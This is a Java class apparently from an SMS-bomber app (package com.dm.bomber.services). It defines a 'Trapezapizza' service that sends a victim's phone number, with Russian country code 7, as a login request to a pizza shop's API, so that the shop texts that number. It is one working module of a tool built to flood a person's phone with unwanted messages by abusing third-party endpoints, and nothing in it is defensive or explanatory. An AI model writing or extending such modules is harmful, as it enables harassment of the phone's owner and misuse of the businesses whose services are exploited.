package com.dm.bomber.services;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Trapezapizza extends Service {

    public Trapezapizza() {
        setPhoneCode("7");
    }

    @Override
    public void run(OkHttpClient client, Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://vps-mamapizzaykt.host4g.ru/rest/api3.php")
                .post(RequestBody.create("-----------------------------21353700541558540041451082424\n" +
                        "Content-Disposition: form-data; name=\"action\"\n" +
                        "\n" +
                        "login\n" +
                        "-----------------------------21353700541558540041451082424\n" +
                        "Content-Disposition: form-data; name=\"user_phone\"\n" +
                        "\n" +
                        phone +
                        "\n-----------------------------21353700541558540041451082424--", MediaType.parse("multipart/form-data; boundary=---------------------------21353700541558540041451082424")))
                .build()).enqueue(callback);
    }
}
